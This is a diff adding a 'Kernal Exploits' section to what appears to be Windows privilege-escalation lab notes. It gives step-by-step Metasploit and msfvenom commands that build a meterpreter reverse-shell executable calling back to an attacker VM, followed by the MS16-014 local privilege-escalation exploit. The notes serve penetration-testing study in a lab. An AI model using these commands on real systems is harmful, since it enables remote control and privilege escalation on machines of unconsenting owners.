@@ -278,7 +278,26 @@ C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
 - Select the Copy the Base64 encoded string.
 - In command prompt type: `echo -ne [Base64 String] | base64 -d`
 - Notice the credentials in the output.
-
+## Kernal Exploits
+- Establish a shell
+- Kali VM
+- Open command prompt and type: `msfconsole`
+- In Metasploit (msf > prompt) type: `use multi/handler`
+- In Metasploit (msf > prompt) type: `set payload windows/meterpreter/reverse_tcp`
+- In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
+- In Metasploit (msf > prompt) type: `run`
+- Open an additional command prompt and type: `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe`
+- Copy the generated file, `shell.exe`, to the Windows VM.
+- Windows VM
+- Execute `shell.exe` and obtain reverse shell
+- Detection & Exploitation
+- Kali VM
+- In Metasploit (msf > prompt) type: `run post/multi/recon/local_exploit_suggester`
+- Identify `exploit/windows/local/ms16_014_wmi_recv_notif as a potential privilege escalation`
+- In Metasploit (msf > prompt) type: `use exploit/windows/local/ms16_014_wmi_recv_notif`
+- In Metasploit (msf > prompt) type: `set SESSION [meterpreter SESSION number]`
+- In Metasploit (msf > prompt) type: `set LPORT 5555`
+- In Metasploit (msf > prompt) type: `run`
 
 
 
